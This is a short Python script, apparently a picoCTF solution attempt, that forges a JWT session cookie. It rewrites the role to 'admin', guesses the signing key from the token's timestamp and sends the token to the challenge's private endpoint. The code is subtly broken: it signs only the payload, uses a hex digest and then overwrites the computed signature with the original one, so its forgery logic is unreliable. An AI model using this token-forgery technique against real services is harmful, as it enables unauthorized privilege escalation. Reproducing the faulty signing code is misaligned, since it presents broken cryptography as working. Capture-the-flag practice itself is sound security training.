import requests
import base64
import hmac
import hashlib

# Original Cookie
working = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjYwNzA1MDU4ODUyLCJyb2xlIjoidXNlciIsImlhdCI6MTY2MDcwNTA1OX0.Vm0o254KhFIOQtk4CiP9BlQAcdq18Ok4AKysb9czLYs"

# signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key)
alg = base64.b64encode(b'{"typ":"JWT","alg":"HS256"}')
msg = base64.b64encode(b'{"auth":1660705058852,"role":"admin","iat":1660705059}')
key = b'1660705058852'
sig = hmac.new( key, msg, hashlib.sha256 ).hexdigest()
sig = b'Vm0o254KhFIOQtk4CiP9BlQAcdq18Ok4AKysb9czLYs'

jwt = f'{alg.decode().replace("=", "")}.{msg.decode().replace("=", "")}.{sig.decode()}'

print(jwt)

print(f"Modified signature matches original: {jwt == working}")

url = "http://saturn.picoctf.net:49697/private"

payload={}
headers = {
  'Cookie': f'token={jwt}'
}

response = requests.request("GET", url, headers=headers, data=payload)

print(response.text)
